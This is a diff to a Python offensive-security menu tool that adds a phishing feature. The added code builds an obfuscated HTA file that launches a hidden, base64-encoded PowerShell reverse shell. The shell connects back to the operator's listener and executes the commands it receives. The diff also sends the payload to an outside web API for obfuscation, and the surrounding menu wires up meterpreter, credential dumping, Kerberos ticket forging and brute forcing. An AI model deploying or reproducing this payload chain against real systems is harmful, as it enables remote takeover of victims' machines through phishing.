@@ -18,8 +18,11 @@ import os
 import sys
 import time
 import getopt
-import os.path
+import base64
+import string
+import random
 import hashlib
+import os.path
 import binascii
 import datetime
 import requests
@@ -87,7 +90,7 @@ with open("up.tmp","r") as local_interface:
    up = local_interface.readlines()
 
 if str(netWork) not in str(up):
-   print(colored("\n[!] WARNING!!! - You need to specify your local network interface on line 67 of this script file...", colour0))
+   print(colored("\n[!] WARNING!!! - You need to specify your local network interface on line 70 of this script file...", colour0))
    exit(1)
 else:
    os.system("ip a s " + netWork + " | awk '/inet/ {print $2}' > localIP.tmp")
@@ -178,7 +181,6 @@ def saveParams():
       config.write(SID + "\n")
       config.write(TSH + "\n")
       config.write(LTM + "\n")
-#      config.write(DIR + "\n")
    return
    
 def privCheck(TGT):
@@ -209,7 +211,7 @@ def keys():
    return
    
 def checkInterface(variable):
-   print("[*] Checking network interface...\n")
+   print("[*] Checking network interface...")
    try:      
       authLevel = RPC_C_AUTHN_LEVEL_NONE
       if variable == "DNS":
@@ -221,17 +223,72 @@ def checkInterface(variable):
       portmap.set_auth_level(authLevel)
       portmap.connect()
       objExporter = IObjectExporter(portmap)
-      bindings = objExporter.ServerAlive2()   
+      bindings = objExporter.ServerAlive2()
+      print("\n")   
       for binding in bindings:
          NetworkAddr = binding['aNetworkAddr']
          print(colored("Address: " + NetworkAddr, colour6))
    except:
-      print("[*] No responce from network interface, checking connection instead...\n")
+      print("[-] No responce from network interface, checking connection instead...\n")
       if variable == "DNS":
            command("ping -c 5 " + DNS.rstrip(" "))
       if variable == "TIP":
            command("ping -c 5 " + TIP.rstrip(" "))
    return
+   
+   
+def idGenerator(size=6, chars=string.ascii_uppercase + string.digits):
+   return ''.join(random.choice(chars) for _ in range(size))
+   
+def body(content):
+   body = f"""<html>
+   <head>
+   <HTA:APPLICATION id="{idGenerator()}"
+   applicationName="{idGenerator()}"
+   border="thin"
+   borderStyle="normal"
+   caption="yes"
+   icon="http://127.0.0.1/{idGenerator()}.ico"
+   maximizeButton="yes"
+   minimizeButton="yes"
+   showInTaskbar="no"
+   windowState="normal"
+   innerBorder="yes"
+   navigable="yes"
+   scroll="auto"
+   scrollFlat="yes"
+   singleInstance="yes"
+   sysMenu="yes"
+   contextMenu="yes"
+   selection="yes"
+   version="1.0" />
+   <script>
+   {content}
+   </script>
+   <title>{idGenerator()}</title>
+   </head>
+   <body>
+   <h1>{idGenerator()}</h1>
+   <hr>
+   </body>
+   </html>"""
+   return body   
+   
+def encrypt(payload):
+   # https://github.com/felamos/weirdhta
+   api_url = "https://enigmatic-shore-46592.herokuapp.com/api/weirdhta"
+   data = r"""{"code" : "%s"}""" % (payload.decode())
+   header = {"Content-Type": "application/json"}
+   r = requests.post(api_url, headers=header, data=data)
+   return r.text
+   
+def powershell(ip, port):
+   # https://forums.hak5.org/topic/39754-reverse-tcp-shell-using-ms-powershell-only/
+   revB64 = "IHdoaWxlICgxIC1lcSAxKQp7CiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ0NvbnRpbnVlJzsKICAgIHRyeQogICAgewogICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoIlNVUEVSSVBBIiwgUE9SVCk7CiAgICAgICAgJHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7CiAgICAgICAgW2J5dGVbXV0kYnl0ZXMgPSAwLi4yNTV8JXswfTsKICAgICAgICAkc2VuZGJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCJDbGllbnQgQ29ubmVjdGVkLi4uIisiYG5gbiIgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKTsKICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZXMsMCwkc2VuZGJ5dGVzLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpOwogICAgICAgIHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkKICAgICAgICB7CiAgICAgICAgICAgICRyZWNkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOwogICAgICAgICAgICBpZigkcmVjZGF0YS5TdGFydHNXaXRoKCJraWxsLWxpbmsiKSl7IGNsczsgJGNsaWVudC5DbG9zZSgpOyBleGl0O30KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNhdHRlbXB0IHRvIGV4ZWN1dGUgdGhlIHJlY2VpdmVkIGNvbW1hbmQKICAgICAgICAgICAgICAgICRzZW5kYmFjayA9IChpZXggJHJlY2RhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsKICAgICAgICAgICAgICAgICRzZW5kYmFjazIgID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICRlcnJvclswXS5JbnZvY2F0aW9uSW5mby5Qb3NpdGlvbk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAkc2VuZGJhY2syICA9ICAiRVJST1I6ICIgKyAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICJgbmBuIiArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7CiAgICAgICAgICAgICAgICBjbHM7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHJldHVybmJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgICAgICAgICAkc3RyZWFtLldyaXRlKCRyZXR1cm5ieXRlcywwLCRyZXR1cm5ieXRlcy5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKTsgICAgICAgICAgCiAgICAgICAgfQogICAgfQogICAgY2F0Y2ggCiAgICB7CiAgICAgICAgaWYoJGNsaWVudC5Db25uZWN0ZWQpCiAgICAgICAgewogICAgICAgICAgICAkY2xpZW50LkNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIGNsczsKICAgICAgICBTdGFydC1TbGVlcCAtcyAzMDsKICAgIH0gICAgIAp9IAo="
+   revPlain = base64.b64decode(revB64).decode()
+   rev = revPlain.replace("SUPERIPA" , ip).replace("PORT", port)
+   payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
+   return payload
 
 def display():
    print('\u2554' + ('\u2550')*14 + '\u2566' + ('\u2550')*42 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2557')
@@ -480,17 +537,17 @@ def display():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set DNS SERVER  (12) Re/Set SERVER TIME (21) GetArch (31) WinDap Search  (41) Kerberos Info  (51) Golden PAC  (61) GenSSHKeyID (71) Hydra FTP  (81) FTP    " + '\u2551')
-   print('\u2551' + "(02) Re/Set REMOTE IP   (13) Whois DNS SERVER   (22) NetView (32) Lookup SIDs    (42) KerbUserFilter (52) Domain Dump (62) GenListUSER (72) Hydra SSH  (82) SSH    " + '\u2551')
-   print('\u2551' + "(03) Re/Set LIVE PORTS  (14) dig DNS SERVER     (23) Service (33) SamDump Users  (43) KerbBruteForce (53) *BloodHound (63) GenListPASS (73) Hydra SMB  (83) SSH ID " + '\u2551')
-   print('\u2551' + "(04) Re/Set WEB ADDRESS (15) Recon DNS SERVER   (24) AtExec  (34) REGistryValues (44) KerbRoasting   (54) *BH ACLPwn  (64) Editor USER (74) Hydra POP3 (84) Telnet " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER NAME   (16) Dump DNS SERVER    (25) DcomExe (35) List EndPoints (45) KerbASREPRoast (55) SecretsDump (65) Editor PASS (75) Hydra TOM  (85) NetCat " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS WORD   (17) NMap LIVE PORTS    (26) PsExec  (36) Rpc Client     (46) PASSWORD2HASH  (56) CrackMapExe (66) Editor HASH (76) MSF TOMCAT (86) SQSH   " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM HASH   (18) NMap PORT Service  (27) SmbExec (37) Smb Client     (47) HASHES Spray   (57) PSExec HASH (67) Editor HOST (77) RemoteSync (87) MSSQL  " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap SubDOMAINS    (28) WmiExec (38) SmbMap SHARE   (48) Pass the HASH  (58) SmbExecHASH (68) GoPhishing  (78) RSyncDumpS (88) MySQL  " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Server TIME   (29) IfMap   (39) SmbCopy Files  (49) Silver Ticket  (59) WmiExecHASH (69) GoBuster    (79) RDeskTop   (89) WinRm  " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN SID                          (30) OpDump  (40) SmbMount SHARE (50) Golden Ticket  (60) NTDSDecrypt (70) Nikto Scan  (80) XDesktop   (90)        " + '\u2551')
-   print('\u2551' + "(11) Re/Set SHARE NAME                                                                                                                                 (91) Exit   " + '\u2551')
+   print('\u2551' + "(01) Re/Set DNS SERVER  (12) Re/Set SERVER TIME (21) GetArch (31) WinDap Search  (41) Kerberos Info  (51) Golden PAC  (61) GenSSHKeyID  (78) Hydra FTP  (89) FTP   " + '\u2551')
+   print('\u2551' + "(02) Re/Set REMOTE IP   (13) Whois DNS SERVER   (22) NetView (32) Lookup SIDs    (42) KerbUserFilter (52) Domain Dump (62) GenListUSER  (79) Hydra SSH  (90) SSH   " + '\u2551')
+   print('\u2551' + "(03) Re/Set LIVE PORTS  (14) dig DNS SERVER     (23) Service (33) SamDump Users  (43) KerbBruteForce (53) *BloodHound (63) GenListPASS  (80) Hydra SMB  (91) SSH ID" + '\u2551')
+   print('\u2551' + "(04) Re/Set WEB ADDRESS (15) Recon DNS SERVER   (24) AtExec  (34) REGistryValues (44) KerbRoasting   (54) *BH ACLPwn  (64) Editor USER  (81) Hydra POP3 (92) Telnet" + '\u2551')
+   print('\u2551' + "(05) Re/Set USER NAME   (16) Dump DNS SERVER    (25) DcomExe (35) List EndPoints (45) KerbASREPRoast (55) SecretsDump (65) Editor PASS  (82) Hydra HTTP (93) NetCat" + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS WORD   (17) NMap LIVE PORTS    (26) PsExec  (36) Rpc Client     (46) PASSWORD2HASH  (56) CrackMapExe (66) Editor HASH  (83) Hydra TOM  (94) SQSH  " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM HASH   (18) NMap PORT Service  (27) SmbExec (37) Smb Client     (47) HASHES Spray   (57) PSExec HASH (67) Editor HOST  (84) MSF TOMCAT (95) MSSQL " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap SubDOMAINS    (28) WmiExec (38) SmbMap SHARE   (48) Pass the HASH  (58) SmbExecHASH (74) Man Phishing (85) RemoteSync (96) MySQL " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Server TIME   (29) IfMap   (39) SmbCopy Files  (49) Silver Ticket  (59) WmiExecHASH (75) AutoPhishing (86) RSyncDumps (97) WinRm " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN SID                          (30) OpDump  (40) SmbMount SHARE (50) Golden Ticket  (60) NTDSDecrypt (76) GoBuster     (87) RDesktop   (98)       " + '\u2551')
+   print('\u2551' + "(11) Re/Set SHARE NAME                                                                                                (77) Nikto Scan   (88) XDesktop   (99) Exit  " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -666,13 +723,10 @@ command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT
 # -------------------------------------------------------------------------------------
 
 print("[*] Starting HTTP server...")
-command("xdotool key Ctrl+Shift+T; sleep 2")
-command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return; sleep 2")
+command("xdotool key Ctrl+Shift+T")
+command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
 command("xdotool type 'clear; cat " + dataDir + "/banner1.txt; cat " + dataDir + "/banner2.txt'; xdotool key Return")
-
-command("xdotool type 'python3 -m http.server 80'; xdotool key Return; sleep 2")
-command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return; sleep 2")
-command("xdotool key Ctrl+Shift+Tab; sleep 2")
+command("xdotool type 'python3 -m http.server 8080'; xdotool key Return")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -683,12 +737,10 @@ command("xdotool key Ctrl+Shift+Tab; sleep 2")
 # -------------------------------------------------------------------------------------
 
 print("[*] Starting SMB server...")
-command("xdotool key Ctrl+Shift+T; sleep 2")
-command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return; sleep 2")
+command("xdotool key Ctrl+Shift+T")
+command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return")
 command("xdotool type 'clear; cat " + dataDir + "/banner3.txt'; xdotool key Return")
-command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return; sleep 2")
-command("xdotool key Ctrl+Shift+Tab; sleep 2")
-command("xdotool key Ctrl+Shift+Tab; sleep 2")
+command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -706,13 +758,27 @@ with open("meterpreter.rc", "w") as write:
    write.write("clear\n")
    write.write("cat " + dataDir + "/banner4.txt\n")
    write.write("run\n")   
-command("xdotool key Ctrl+Shift+T; sleep 2")
-command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return; sleep 2")
+   
+command("xdotool key Ctrl+Shift+T")
+command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
 command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
-command("xdotool key Ctrl+Shift+Tab; sleep 2")
-command("xdotool key Ctrl+Shift+Tab; sleep 2")
-command("xdotool key Ctrl+Shift+Tab; sleep 2")
-time.sleep(5)
+
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Start phishing server
+# Modified: N/A                                                               	
+# -------------------------------------------------------------------------------------
+
+print("[*] Starting phishing server...")
+command("xdotool key Ctrl+Shift+T")
+command("xdotool key Alt+Shift+S; xdotool type 'GO PHISHING'; xdotool key Return")
+command("xdotool type 'clear; cat " + dataDir + "/banner5.txt'; xdotool key Return")
+command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return")
+command("xdotool key Ctrl+Shift+Tab")
+
+command("sleep 5")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -2471,6 +2537,32 @@ while True:
       command("nano /etc/hosts")
       prompt()
       
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Manual Phising...
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='74':    
+      print("[*] Creating exploit...")
+      
+      payLoad = f"""      
+      a=new ActiveXObject("WScript.Shell");
+      a.run("powershell -nop -w 1 -enc {powershell(localIP, "80")}", 0);window.close();
+      """.encode()
+            
+      bpayLoad = base64.b64encode(payLoad)
+      final = encrypt(bpayLoad)
+      with open('payrise.hta', 'w') as hta:
+         hta.write(body(final))
+         
+      print("[+] Exploit created, utilise the following code snippet to activate...")
+      print(colored("\nhttp://" + localIP + ":8080/payrise.hta",colour6))
+      prompt()      
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -2479,7 +2571,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='68':
+   if selection =='75':
       checkParams = testTwo()
       if "25" not in POR:
          print(colored("[!] WARNING!!! - Port 25 not found in remote live ports listing...", colour0))
@@ -2554,7 +2646,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='69':
+   if selection =='76':
       checkParams = testOne()           
       if checkParams != 1:
          if WEB[:5] == "EMPTY":
@@ -2574,7 +2666,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='70':
+   if selection =='77':
       checkParams = testOne()
       if checkParams != 1:
          if ":" in TIP:
@@ -2595,7 +2687,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='71':
+   if selection =='78':
       checkParams = testOne()         
       if checkParams != 1:
          if os.path.getsize(dataDir + "/usernames.txt") == 0:
@@ -2631,7 +2723,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='72':
+   if selection =='79':
       checkParams = testOne()         
       if checkParams != 1:
          if os.path.getsize(dataDir + "/usernames.txt") == 0:
@@ -2667,7 +2759,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='73':
+   if selection =='80':
       checkParams = testOne()
       if checkParams != 1:
          if os.path.getsize(dataDir + "/usernames.txt") == 0:
@@ -2703,7 +2795,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='74':
+   if selection =='81':
       checkParams = testOne()         
       if checkParams != 1:
          if os.path.getsize(dataDir + "/usernames.txt") == 0:
@@ -2734,6 +2826,19 @@ while True:
             USER[x] = spacePadding(USER[x], COL3)            
       prompt()
       
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - HYDRA HTTP LOGIN BRUTE
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='82':
+      print("[-] Not implemented yet...")
+      prompt()
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -2742,7 +2847,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='75':  
+   if selection =='83':  
       if WEB[:5] == "EMPTY":
          print("[+] Target web address not specified...")
       else:
@@ -2776,7 +2881,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='76':
+   if selection =='84':
       command("touch meterpreter.rc")
       command("echo 'use exploit/multi/http/tomcat_mgr_upload' >> meterpreter.rc")
       command("echo 'set RHOSTS " + TIP.rstrip(" ") + "' >> meterpreter.rc")
@@ -2809,7 +2914,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='77':
+   if selection =='85':
       checkParams = testOne()   
       if checkParams != 1:
          if "873" in POR:
@@ -2826,7 +2931,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='78':
+   if selection =='86':
       checkParams = testOne()      
       if checkParams != 1:
          if "873" in POR:
@@ -2843,7 +2948,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='79':
+   if selection =='87':
       checkParams = testOne()   
       if checkParams != 1:
          command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
@@ -2857,7 +2962,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '80':
+   if selection == '88':
       checkParams = testOne()      
       if checkParams != 1:
          command("xfreerdp /u:" + USR.rstrip(" ") + " /p:'" + PAS.rstrip(" ") + "' /v:" + TIP.rstrip(" "))
@@ -2871,7 +2976,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='81':
+   if selection =='89':
       checkParams = testOne()      
       if checkParams != 1:
          command("ftp " + TIP.rstrip(" ") + " 21")
@@ -2885,7 +2990,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='82':
+   if selection =='90':
       checkParams = testOne()      
       if checkParams != 1:
          command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " -p 22")
@@ -2899,7 +3004,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='83':
+   if selection =='91':
       checkParams = testOne()      
       if checkParams != 1:
          command("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
@@ -2913,7 +3018,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='84':
+   if selection =='92':
       checkParams = testOne()      
       if checkParams != 1:
          command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " 23")
@@ -2927,7 +3032,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='85':
+   if selection =='93':
       checkParams = testOne()      
       if checkParams != 1:
          command("nc " + TIP.rstrip(" ") + " 80")
@@ -2941,7 +3046,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='86':
+   if selection =='94':
       checkParams = testOne()      
       if checkParams != 1:
          command("sqsh -S " + TIP.rstrip(" ") + " -L user=" + USR.rstrip(" ") + " -L password=" + PAS.rstrip(" "))
@@ -2955,7 +3060,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='87':
+   if selection =='95':
       checkParams = testTwo()   
       if checkParams != 1:
           command(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
@@ -2971,7 +3076,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='88':
+   if selection =='96':
       checkParams = testOne()      
       if checkParams != 1:
          command("mysql -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -h " + TIP.rstrip(" "))
@@ -2985,7 +3090,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='89':
+   if selection =='97':
       checkParams = testOne()      
       if checkParams != 1:            
          if NTM[:5] != "EMPTY":
@@ -3003,7 +3108,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='90':
+   if selection =='98':
       exit(1)               
                  
 # ------------------------------------------------------------------------------------- 
@@ -3014,7 +3119,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '91':        
+   if selection == '99':        
       saveParams()      
       if DOMC == 1:
          print("[*] Removing domain name from /etc/hosts...")
